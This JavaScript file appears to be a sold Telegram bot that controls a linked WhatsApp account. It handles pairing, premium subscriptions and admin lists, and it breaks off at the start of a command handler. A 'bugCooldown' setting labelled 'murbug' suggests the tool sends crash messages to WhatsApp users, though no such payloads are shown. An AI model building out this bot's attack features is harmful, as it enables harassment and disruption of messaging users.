const { Telegraf, Markup } = require("telegraf");
const fs = require('fs');
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const chalk = require('chalk');
const axios = require('axios');
const moment = require('moment-timezone');
const { BOT_TOKEN, allowedDevelopers } = require("./config");
const tdxlol = fs.readFileSync('./tdx.jpeg');
const crypto = require('crypto');
const o = fs.readFileSync(`./o.jpg`)
// --- Inisialisasi Bot Telegram ---
const bot = new Telegraf(BOT_TOKEN);

// --- Variabel Global ---
let Dragon = null;
let isWhatsAppConnected = false;
const usePairingCode = true; // Tidak digunakan dalam kode Anda
let maintenanceConfig = {
    maintenance_mode: false,
    message: "This script is currently undergoing maintenance so just wait"
};
let premiumUsers = {};
let adminList = [];
let ownerList = [];
let deviceList = [];
let userActivity = {};
let allowedBotTokens = [];
let ownerataubukan;
let adminataubukan;
let Premiumataubukan;

function startBot() {
  console.log(chalk.blue(`THANKS UDAH BUY SC DI DRAGON`));
}

startBot(); 
// --- Fungsi untuk Mengecek Apakah User adalah Owner ---
const isOwner = (userId) => {
    if (ownerList.includes(userId.toString())) {
        ownerataubukan = "✅";
        return true;
    } else {
        ownerataubukan = "❌";
        return false;
    }
};

const OWNER_ID = (userId) => {
    if (allowedDevelopers.includes(userId.toString())) {
        ysudh = "✅";
        return true;
    } else {
        gnymbung = "❌";
        return false;
    }
};

// --- Fungsi untuk Mengecek Apakah User adalah Admin ---
const isAdmin = (userId) => {
    if (adminList.includes(userId.toString())) {
        adminataubukan = "✅";
        return true;
    } else {
        adminataubukan = "❌";
        return false;
    }
};

// --- Fungsi untuk Menambahkan Admin ---
const addAdmin = (userId) => {
    if (!adminList.includes(userId)) {
        adminList.push(userId);
        saveAdmins();
    }
};

// --- Fungsi untuk Menghapus Admin ---
const removeAdmin = (userId) => {
    adminList = adminList.filter(id => id !== userId);
    saveAdmins();
};

// --- Fungsi untuk Menyimpan Daftar Admin ---
const saveAdmins = () => {
    fs.writeFileSync('./admins.json', JSON.stringify(adminList));
};

// --- Fungsi untuk Memuat Daftar Admin ---
const loadAdmins = () => {
    try {
        const data = fs.readFileSync('./admins.json');
        adminList = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat daftar admin:'), error);
        adminList = [];
    }
};

// --- Fungsi untuk Menambahkan User Premium ---
const addPremiumUser = (userId, durationDays) => {
    const expirationDate = moment().tz('Asia/Jakarta').add(durationDays, 'days');
    premiumUsers[userId] = {
        expired: expirationDate.format('YYYY-MM-DD HH:mm:ss')
    };
    savePremiumUsers();
};

// --- Fungsi untuk Menghapus User Premium ---
const removePremiumUser = (userId) => {
    delete premiumUsers[userId];
    savePremiumUsers();
};

// --- Fungsi untuk Mengecek Status Premium ---
const isPremiumUser = (userId) => {
    const userData = premiumUsers[userId];
    if (!userData) {
        Premiumataubukan = "❌";
        return false;
    }

    const now = moment().tz('Asia/Jakarta');
    const expirationDate = moment(userData.expired, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta');

    if (now.isBefore(expirationDate)) {
        Premiumataubukan = "✅";
        return true;
    } else {
        Premiumataubukan = "❌";
        return false;
    }
};

// --- Fungsi untuk Menyimpan Data User Premium ---
const savePremiumUsers = () => {
    fs.writeFileSync('./premiumUsers.json', JSON.stringify(premiumUsers));
};

// --- Fungsi untuk Memuat Data User Premium ---
const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync('./premiumUsers.json');
        premiumUsers = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat data user premium:'), error);
        premiumUsers = {};
    }
};

// --- Fungsi untuk Memuat Daftar Device ---
const loadDeviceList = () => {
    try {
        const data = fs.readFileSync('./ListDevice.json');
        deviceList = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat daftar device:'), error);
        deviceList = [];
    }
};

// --- Fungsi untuk Menyimpan Daftar Device ---
const saveDeviceList = () => {
    fs.writeFileSync('./ListDevice.json', JSON.stringify(deviceList));
};

// --- Fungsi untuk Menambahkan Device ke Daftar ---
const addDeviceToList = (userId, token) => {
    const deviceNumber = deviceList.length + 1;
    deviceList.push({
        number: deviceNumber,
        userId: userId,
        token: token
    });
    saveDeviceList();
    console.log(chalk.white.bold(`
╭─────────────────
┃ ${chalk.white.bold('DETECT NEW PERANGKAT')}
┃ ${chalk.white.bold('DEVICE NUMBER: ')} ${chalk.yellow.bold(deviceNumber)}
╰─────────────────`));
};

// --- Fungsi untuk Mencatat Aktivitas Pengguna ---
const recordUserActivity = (userId, userNickname) => {
    const now = moment().tz('Asia/Jakarta').format('YYYY-MM-DD HH:mm:ss');
    userActivity[userId] = {
        nickname: userNickname,
        last_seen: now
    };

    // Menyimpan aktivitas pengguna ke file
    fs.writeFileSync('./userActivity.json', JSON.stringify(userActivity));
};

// --- Fungsi untuk Memuat Aktivitas Pengguna ---
const loadUserActivity = () => {
    try {
        const data = fs.readFileSync('./userActivity.json');
        userActivity = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat aktivitas pengguna:'), error);
        userActivity = {};
    }
};

// --- Middleware untuk Mengecek Mode Maintenance ---
const checkMaintenance = async (ctx, next) => {
    let userId, userNickname;

    if (ctx.from) {
        userId = ctx.from.id.toString();
        userNickname = ctx.from.first_name || userId;
    } else if (ctx.update.channel_post && ctx.update.channel_post.sender_chat) {
        userId = ctx.update.channel_post.sender_chat.id.toString();
        userNickname = ctx.update.channel_post.sender_chat.title || userId;
    }

    // Catat aktivitas hanya jika userId tersedia
    if (userId) {
        recordUserActivity(userId, userNickname);
    }

    if (maintenanceConfig.maintenance_mode && !OWNER_ID(ctx.from.id)) {
        // Jika mode maintenance aktif DAN user bukan developer:
        // Kirim pesan maintenance dan hentikan eksekusi middleware
        console.log("Pesan Maintenance:", maintenanceConfig.message);
        const escapedMessage = maintenanceConfig.message.replace(/\*/g, '\\*'); // Escape karakter khusus
        return await ctx.replyWithMarkdown(escapedMessage);
    } else {
        // Jika mode maintenance tidak aktif ATAU user adalah developer:
        // Lanjutkan ke middleware/handler selanjutnya
        await next();
    }
};

// --- Middleware untuk Mengecek Status Premium ---
const checkPremium = async (ctx, next) => {
    if (isPremiumUser(ctx.from.id)) {
        await next();
    } else {
        await ctx.reply("❌ you are not a premium user ");
    }
};


bot.use(async (ctx, next) => {
    return next();
});
// --- Koneksi WhatsApp ---
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });

const startSesi = async () => {
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }), // Log level diubah ke "info"
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'P', // Placeholder, you can change this or remove it
        }),
    };

    Dragon = makeWASocket(connectionOptions);

    Dragon.ev.on('creds.update', saveCreds);
    store.bind(Dragon.ev);

    Dragon.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'open') {
            isWhatsAppConnected = true;
            console.log(chalk.white.bold(`
╭─────────────────
┃   ${chalk.green.bold('WHATSAPP CONNECTED')}
╰─────────────────`));
        }

        if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.white.bold(`
╭─────────────────
┃   ${chalk.red.bold('WHATSAPP DISCONNECTED')}
╰─────────────────`),
                shouldReconnect ? chalk.white.bold(`
╭─────────────────
┃   ${chalk.red.bold('RECONNECTING AGAIN')}
╰─────────────────`) : ''
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
}

(async () => {
    console.log(chalk.whiteBright.bold(`
╭─────────────────
┃ ${chalk.yellowBright.bold('KELAS KINK TERHUBUNG LANCAR')}
╰─────────────────`));

    console.log(chalk.red.bold(`
⢻⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⠤⠤⠴⢶⣶⡶⠶⠤⠤⢤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⠁
⠀ ⠻⣯⡗⢶⣶⣶⣶⣶⢶⣤⣄⣀⣀⡤⠒⠋⠁⠀⠀⠀⠀⠚⢯⠟⠂⠀⠀⠀⠀⠉⠙⠲⣤⣠⡴⠖⣲⣶⡶⣶⣿⡟⢩⡴⠃⠀
 ⠀⠀⠈⠻⠾⣿⣿⣬⣿⣾⡏⢹⣏⠉⠢⣄⣀⣀⠤⠔⠒⠊⠉⠉⠉⠉⠑⠒⠀⠤⣀⡠⠚⠉⣹⣧⣝⣿⣿⣷⠿⠿⠛⠉⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⣹⠟⠛⠿⣿⣤⡀⣸⠿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠾⣇⢰⣶⣿⠟⠋⠉⠳⡄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⡞⠁⠀⠀⡠⢾⣿⣿⣯⠀⠈⢧⡀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠁⢀⣿⣿⣯⢼⠓⢄⠀⢀⡘⣦⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣰⣟⣟⣿⣀⠎⠀⠀⢳⠘⣿⣷⡀⢸⣿⣶⣤⣄⣀⣤⢤⣶⣿⡇⢀⣾⣿⠋⢀⡎⠀⠀⠱⣤⢿⠿⢷⡀⠀⠀⠀⠀
⠀⠀⠀⠀⣰⠋⠀⠘⣡⠃⠀⠀⠀⠈⢇⢹⣿⣿⡾⣿⣻⣖⠛⠉⠁⣠⠏⣿⡿⣿⣿⡏⠀⡼⠀⠀⠀⠀⠘⢆⠀⠀⢹⡄⠀⠀⠀
⠀⠀⠀⢰⠇⠀⠀⣰⠃⠀⠀⣀⣀⣀⣼⢿⣿⡏⡰⠋⠉⢻⠳⣤⠞⡟⠀⠈⢣⡘⣿⡿⠶⡧⠤⠄⣀⣀⠀⠈⢆⠀⠀⢳⠀⠀⠀
⠀⠀⠀⡟⠀⠀⢠⣧⣴⣊⣩⢔⣠⠞⢁⣾⡿⢹⣷⠋⠀⣸⡞⠉⢹⣧⡀⠐⢃⢡⢹⣿⣆⠈⠢⣔⣦⣬⣽⣶⣼⣄⠀⠈⣇⠀⠀
⠀⠀⢸⠃⠀⠘⡿⢿⣿⣿⣿⣛⣳⣶⣿⡟⣵⠸⣿⢠⡾⠥⢿⡤⣼⠶⠿⡶⢺⡟⣸⢹⣿⣿⣾⣯⢭⣽⣿⠿⠛⠏⠀⠀⢹⠀⠀
⠀⠀⢸⠀⠀⠀⡇⠀⠈⠙⠻⠿⣿⣿⣿⣇⣸⣧⣿⣦⡀⠀⣘⣷⠇⠀⠄⣠⣾⣿⣯⣜⣿⣿⡿⠿⠛⠉⠀⠀⠀⢸⠀⠀⢸⡆⠀
⠀⠀⢸⠀⠀⠀⡇⠀⠀⠀⠀⣀⠼⠋⢹⣿⣿⣿⡿⣿⣿⣧⡴⠛⠀⢴⣿⢿⡟⣿⣿⣿⣿⠀⠙⠲⢤⡀⠀⠀⠀⢸⡀⠀⢸⡇⠀
⠀⠀⢸⣀⣷⣾⣇⠀⣠⠴⠋⠁⠀⠀⣿⣿⡛⣿⡇⢻⡿⢟⠁⠀⠀⢸⠿⣼⡃⣿⣿⣿⡿⣇⣀⣀⣀⣉⣓⣦⣀⣸⣿⣿⣼⠁⠀
⠀⠀⠸⡏⠙⠁⢹⠋⠉⠉⠉⠉⠉⠙⢿⣿⣅⠀⢿⡿⠦⠀⠁⠀⢰⡃⠰⠺⣿⠏⢀⣽⣿⡟⠉⠉⠉⠀⠈⠁⢈⡇⠈⠇⣼⠀⠀
⠀⠀⠀⢳⠀⠀⠀⢧⠀⠀⠀⠀⠀⠀⠈⢿⣿⣷⣌⠧⡀⢲⠄⠀⠀⢴⠃⢠⢋⣴⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⡸⠀⠀⢠⠇⠀⠀
⠀⠀⠀⠈⢧⠀⠀⠈⢦⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣧⠐⠸⡄⢠⠀⢸⠀⢠⣿⣟⡿⠋⠀⠀⠀⠀⠀⠀⠀⡰⠁⠀⢀⡟⠀⠀⠀
⠀⠀⠀⠀⠈⢧⠀⠀⠀⠣⡀⠀⠀⠀⠀⠀⠀⠈⠛⢿⡇⢰⠁⠸⠄⢸⠀⣾⠟⠉⠀⠀⠀⠀⠀⠀⠀⢀⠜⠁⠀⢀⡞⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⢧⡀⠀⠀⠙⢄⠀⠀⠀⠀⠀⠀⠀⢨⡷⣜⠀⠀⠀⠘⣆⢻⠀⠀⠀⠀⠀⠀⠀⠀⡴⠋⠀⠀⣠⠎⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠑⢄⠀⠀⠀⠑⠦⣀⠀⠀⠀⠀⠈⣷⣿⣦⣤⣤⣾⣿⢾⠀⠀⠀⠀⠀⣀⠴⠋⠀⠀⢀⡴⠃⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⢄⡀⢸⣶⣿⡑⠂⠤⣀⡀⠱⣉⠻⣏⣹⠛⣡⠏⢀⣀⠤⠔⢺⡧⣆⠀⢀⡴⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⢽⡁⠀⠀⠀⠀⠈⠉⠙⣿⠿⢿⢿⠍⠉⠀⠀⠀⠀⠉⣻⡯⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⠲⠤⣀⣀⡀⠀⠈⣽⡟⣼⠀⣀⣀⣠⠤⠒⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⢻⡏⠉⠉⠁⠀⠀⠀⠀⠀⠀
⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈
${chalk.white.bold('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')}
${chalk.white.bold('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')}
            ${chalk.blue.bold('THANKS TO BUYER')}
            ${chalk.blue.bold('DEVELOPER : @Rizzxtzy')}
            ${chalk.blue.bold('SUPPORT : [ EMAK ]')}
            ${chalk.blue.bold('Friend : @xlilnyx')}
            ${chalk.blue.bold('Friend : @frmnzz25')}
              ${chalk.green.bold('ALLAH SWT')}
${chalk.white.bold('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')}
${chalk.white.bold('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')}
`));

    loadPremiumUsers();
    loadAdmins();
    loadDeviceList();
    loadUserActivity();
    
    startSesi();

    // Menambahkan device ke ListDevice.json saat inisialisasi
    addDeviceToList(BOT_TOKEN, BOT_TOKEN);
})();

// Command untuk pairing WhatsApp
// Command handler untuk addpairing
bot.command("addpairing", async (ctx) => {
  if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
    return await ctx.reply(
      "❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini."
    );
  }

  // Cek jika WhatsApp sudah terhubung
  if (Dragon && Dragon.user) {
    const connectedMessage = `
╭──「 sᴛᴀᴛᴜs 」  
┃
┃ WHATSAPP SUDAH TERHUBUNG 
┃ ᴅᴇᴛᴀɪʟ ɴᴜᴍʙᴇʀ:
┃ • Nama: ${Dragon.user.name || "Tidak diketahui"}
┃ • Nomor: ${Dragon.user.id.split(":")[0]}
┃ • Platform: ${Dragon.user.platform || "WhatsApp"}
╰─────────────────❍`;

    return await ctx.reply(connectedMessage, {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "❌ Close", callback_data: "close" }]],
      },
    });
  }

  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return await ctx.reply(
      "❌ Format perintah salah. Gunakan: /addpairing <nomor_wa>"
    );
  }

  let phoneNumber = args[1];
  // Hapus semua karakter non-digit
  phoneNumber = phoneNumber.replace(/[^0-9]/g, "");

  // Validasi panjang nomor minimal
  if (phoneNumber.length < 8) {
    return await ctx.reply("❌ Nomor telepon tidak valid. Minimal 8 digit.");
  }

  // Fungsi untuk mengecek dan menambahkan prefix negara
  const addCountryCode = (number) => {
    // Jika nomor sudah memiliki kode negara, biarkan apa adanya
    if (
      number.match(
        /^(1|7|20|27|30|31|32|33|34|36|39|40|41|43|44|45|46|47|48|49|51|52|53|54|55|56|57|58|60|61|62|63|64|65|66|81|82|84|86|90|91|92|93|94|95|98|212|213|216|218|220|221|222|223|224|225|226|227|228|229|230|231|232|233|234|235|236|237|238|239|240|241|242|243|244|245|246|247|248|249|250|251|252|253|254|255|256|257|258|260|261|262|263|264|265|266|267|268|269|290|291|297|298|299|350|351|352|353|354|355|356|357|358|359|370|371|372|373|374|375|376|377|378|379|380|381|382|383|385|386|387|389|420|421|423|500|501|502|503|504|505|506|507|508|509|590|591|592|593|594|595|596|597|598|599|670|672|673|674|675|676|677|678|679|680|681|682|683|685|686|687|688|689|690|691|692|850|852|853|855|856|872|880|886|960|961|962|963|964|965|966|967|968|970|971|972|973|974|975|976|977|992|993|994|995|996|998)/
      )
    ) {
      return number;
    }
    // Jika tidak ada kode negara, tambahkan 62 (Indonesia)
    return "62" + number;
  };

  phoneNumber = addCountryCode(phoneNumber);

  // Tambahkan pengecekan eksplisit untuk Dragon
  if (!Dragon) {
    try {
      await startSesi();
      await new Promise((resolve) => setTimeout(resolve, 5000));
    } catch (initError) {
      console.error("Gagal menginisialisasi WhatsApp:", initError);
      return await ctx.reply(
        "❌ Gagal menginisialisasi koneksi WhatsApp. Silakan coba lagi."
      );
    }
  }

  if (!Dragon || !Dragon.requestPairingCode) {
    return await ctx.reply(
      "❌ Koneksi WhatsApp belum siap. Silakan coba lagi dalam beberapa saat."
    );
  }

  try {
    const code = await Dragon.requestPairingCode(phoneNumber, "DRAGONXY");
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

    await ctx.replyWithPhoto("https://files.catbox.moe/jwlhic.jpg", {
      caption: `
╭──「  ʏᴏᴜʀ ᴘᴀɪʀɪɴɢ  」 
┃ ɴᴏᴍᴏʀ: ${phoneNumber}
┃ ᴄᴏᴅᴇ: \`${formattedCode}\`
╰─────────────────❍`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "❌ Close", callback_data: "close" }]],
      },
    });
  } catch (error) {
    console.error(chalk.red("Gagal melakukan pairing:"), error);
    await ctx.reply(
      "❌ Gagal melakukan pairing. Pastikan WhatsApp sudah terhubung dan nomor valid."
    );
  }
});

// Handler untuk gencode callback query
bot.action(/gencode_(.+)/, async (ctx) => {
  try {
    const phoneNumber = ctx.match[1];

    // Tampilkan status loading (gunakan callback.answer sebagai gantinya)
    await ctx.callback.answer("Generating new code...");

    if (Dragon && Dragon.user) {
      return await ctx.editMessageCaption(
        "ℹ️ WhatsApp sudah terhubung. Tidak perlu pairing lagi.",
        {
          reply_markup: {
            inline_keyboard: [[{ text: "❌ Close", callback_data: "close" }]],
          },
        }
      );
    }

    const code = await Dragon.requestPairingCode(phoneNumber, "DRAGONXY");
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

    await ctx.editMessageCaption(
      `
╭──「  𝗣𝗔𝗜𝗥𝗜𝗡𝗚 𝗖𝗢𝗗𝗘  」
┃ 𝗡𝗼𝗺𝗼𝗿: ${phoneNumber}
┃ 𝗞𝗼𝗱𝗲: \`${formattedCode}\`
╰─────────────────❍`,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "🔄 Generate New Code",
                callback_data: `gencode_${phoneNumber}`,
              },
            ],
            [{ text: "❌ Close", callback_data: "close" }],
          ],
        },
      }
    );
  } catch (error) {
    console.error("Error generating new code:", error);
    // Gunakan callback.answer untuk error juga
    await ctx.callback.answer(
      "❌ Gagal generate kode baru. Silakan coba lagi."
    );
  }
});

// Handler untuk tombol close
bot.action("close", async (ctx) => {
  try {
    await ctx.deleteMessage();
  } catch (error) {
    console.error(chalk.red("Gagal menghapus pesan:"), error);
  }
});

bot.command("setjeda", async (ctx) => {
  // Permission check
  if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
    return await ctx.reply(
      "❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini."
    );
  }

  const args = ctx.message.text.split(/\s+/);
  if (args.length < 2 || isNaN(args[1])) {
    return await ctx.reply(`
╭❌ Format perintah salah. Gunakan: /setjeda <detik>`);
  }

  const newCooldown = parseInt(args[1]);

  // Validasi input
  if (newCooldown < 10 || newCooldown > 99999) {
    return await ctx.reply("❌ Jeda harus antara 10 - 9999 detik!");
  }

  bugCooldown = newCooldown;
  await ctx.reply(`
╭──「 ᴍᴜʀʙᴜɢ sᴇᴛᴛɪɴɢs 」
│ • Status: Berhasil ✅
│ • Jeda: ${bugCooldown} detik
╰──────────────────❍`);
});

// Delete Premium Command
bot.command("delprem", async (ctx) => {
  if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id) && !isAdmin(ctx.from.id)) {
      return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
  }

  let userId;

  // Cek jika command merupakan reply ke pesan
  if (ctx.message.reply_to_message) {
      userId = ctx.message.reply_to_message.from.id.toString();
  } else {
      const args = ctx.message.text.split(" ")[1];
      if (!args) {
          return await ctx.reply(`❌ Format perintah salah. Gunakan: /delprem <id>`);
      }

      // Jika input adalah username
      if (args.startsWith("@")) {
          try {
              const username = args.slice(1);
              const chatMember = await ctx.telegram.getChatMember(ctx.chat.id, `@${username}`);
              userId = chatMember.user.id.toString();
          } catch (error) {
              return await ctx.reply("❌ Username tidak ditemukan atau bukan member dari grup ini.");
          }
      } else {
          if (!/^\d+$/.test(args)) {
              return await ctx.reply("❌ ID harus berupa angka!");
          }
          userId = args;
      }
  }

  // Cek apakah user adalah premium
  if (!premiumUsers[userId]) {
      return await ctx.reply(`❌ User dengan ID ${userId} tidak terdaftar sebagai user premium.`);
  }

  try {
      const user = await ctx.telegram.getChat(userId);
      removePremiumUser(userId);

      const successMessage = `
╭──「  𝗗𝗘𝗟𝗘𝗧𝗘 𝗣𝗥𝗘𝗠 」
┃ ✅ BERHASIL MENGHAPUS PREM
┃ 𝗗𝗲𝘁𝗮𝗶𝗹 𝗨𝘀𝗲𝗿:
┃ • ID: ${userId}
┃ • Username: ${user.username ? '@' + user.username : 'Tidak ada'}
╰─────────────────`;

      await ctx.replyWithMarkdown(successMessage, {
          reply_markup: {
              inline_keyboard: [
                  [{ text: "❌ Close", callback_data: "close" }]
              ]
          }
      });
  } catch (error) {
      console.error('Error removing premium:', error);
      await ctx.reply("❌ Gagal menghapus premium. Pastikan ID/Username valid.");
  }
});


// Command /addprem - Menambahkan user premium
bot.command("addprem", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id) && !isAdmin(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const args = ctx.message.text.split(" ");
    let userId;
    let durationDays;

    // Parse durasi dari argument terakhir
    durationDays = parseInt(args[args.length - 1]);
    if (isNaN(durationDays) || durationDays <= 0) {
      return await ctx.reply(`
┏━━━❰ Tutorial Addowner ❱━━━
┣⟣ Format tidak valid!
┣⟣ Contoh: /addowner <user_id> <Durasi>
┣⟣ Durasi: 
┃  • 30d (30 hari)
┃  • 24h (24 jam)
┃  • 1m (1 bulan)
┗━━━━━━━━━━━━━━━`);
    }

    // Jika command merupakan reply ke pesan
    if (ctx.message.reply_to_message) {
        userId = ctx.message.reply_to_message.from.id.toString();
    } 
    // Jika ada username/mention atau ID yang diberikan
    else if (args.length >= 3) {
        const userArg = args[1];
        
        // Jika input adalah username (dimulai dengan @)
        if (userArg.startsWith("@")) {
            try {
                const username = userArg.slice(1);
                const chatMember = await ctx.telegram.getChatMember(ctx.chat.id, `@${username}`);
                userId = chatMember.user.id.toString();
            } catch (error) {
                console.log("Error getting user by username:", error);
                userId = null;
            }
        } 
        // Jika input adalah ID langsung
        else {
            userId = userArg.toString();
        }
    }

    if (!userId) {
        return await ctx.reply("❌ Tidak dapat menemukan user. Pastikan ID/Username valid.");
    }

    try {
        // Tambahkan user ke premium
        addPremiumUser(userId, durationDays);

        const expirationDate = premiumUsers[userId].expired;
        const formattedExpiration = moment(expirationDate, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta').format('DD-MM-YYYY HH:mm:ss');

        const successMessage = `
╭──「  𝗔𝗗𝗗 𝗣𝗥𝗘𝗠 」
┃ ✅ BERHASIL MENAMBAH PREM
┃ 𝗗𝗲𝘁𝗮𝗶𝗹 𝗣𝗿𝗲𝗺𝗶𝘂𝗺:
┃ • ID: ${userId}
┃ • Durasi: ${durationDays} hari
┃ • Expired: ${formattedExpiration} WIB
╰─────────────────`;

        await ctx.replyWithMarkdown(successMessage, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: "❌ Close", callback_data: "close" }]
                ]
            }
        });

    } catch (error) {
        console.error('Error adding premium:', error);
        await ctx.reply("❌ Gagal menambahkan premium. Silakan coba lagi.");
    }
});



// Handler untuk callback listprem
bot.action("listprem", async (ctx) => {
  try {
    let premText = `╭═══❲ ᴘʀᴇᴍ ʟɪsᴛ ❳═══⊱\n┃\n`;

    for (const [userId, userData] of Object.entries(premiumUsers)) {
      try {
        const user = await ctx.telegram.getChat(userId);
        const expiry = moment(userData.expired).tz("Asia/Jakarta");
        const timeLeft = expiry.fromNow();

        premText += `┃ ⬡ ${user.first_name}\n`;
        premText += `┃    ${timeLeft}\n`;
      } catch (error) {
        premText += `┃ ⬡ Unknown User\n`;
        premText += `┃    ID: ${userId}\n`;
      }
    }

    premText += `┃\n┃ Total: ${Object.keys(premiumUsers).length} Premium\n`;
    premText += `╰═════════════════⊱\n`;
    premText += `           ᴛʜᴇ ᴅʀᴀɢᴏɴ`;

    await ctx.editMessageText(premText, {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "〆", callback_data: "close" }]],
      },
    });
  } catch (error) {
    console.error("Error displaying premium list:", error);
    await ctx.answerCallbackQuery("❌ Gagal menampilkan daftar premium.");
  }
});

// Callback Query untuk Menampilkan Status Premium
bot.action(/cekprem_(.+)/, async (ctx) => {
  const userId = ctx.match[1];
  if (
    userId !== ctx.from.id.toString() &&
    !OWNER_ID(ctx.from.id) &&
    !isOwner(ctx.from.id) &&
    !isAdmin(ctx.from.id)
  ) {
    return await ctx.answerCbQuery(
      "❌ Anda tidak memiliki akses untuk mengecek status premium user lain."
    );
  }

  if (!premiumUsers[userId]) {
    return await ctx.answerCbQuery(
      `❌ User dengan ID ${userId} tidak terdaftar sebagai user premium.`
    );
  }

  const expirationDate = premiumUsers[userId].expired;
  const formattedExpiration = moment(expirationDate, "YYYY-MM-DD HH:mm:ss")
    .tz("Asia/Jakarta")
    .format("DD-MM-YYYY HH:mm:ss");
  const timeLeft = moment(expirationDate, "YYYY-MM-DD HH:mm:ss")
    .tz("Asia/Jakarta")
    .fromNow();

  const message = `
ℹ️ Status Premium User *${userId}*

*Detail:*
- *ID User:* ${userId}
- *Kadaluarsa:* ${formattedExpiration} WIB
- *Sisa Waktu:* ${timeLeft}

Terima kasih telah menjadi bagian dari komunitas premium kami!
    `;

  await ctx.answerCbQuery();
  await ctx.replyWithMarkdown(message);
});

bot.command("brat", async (ctx) => {
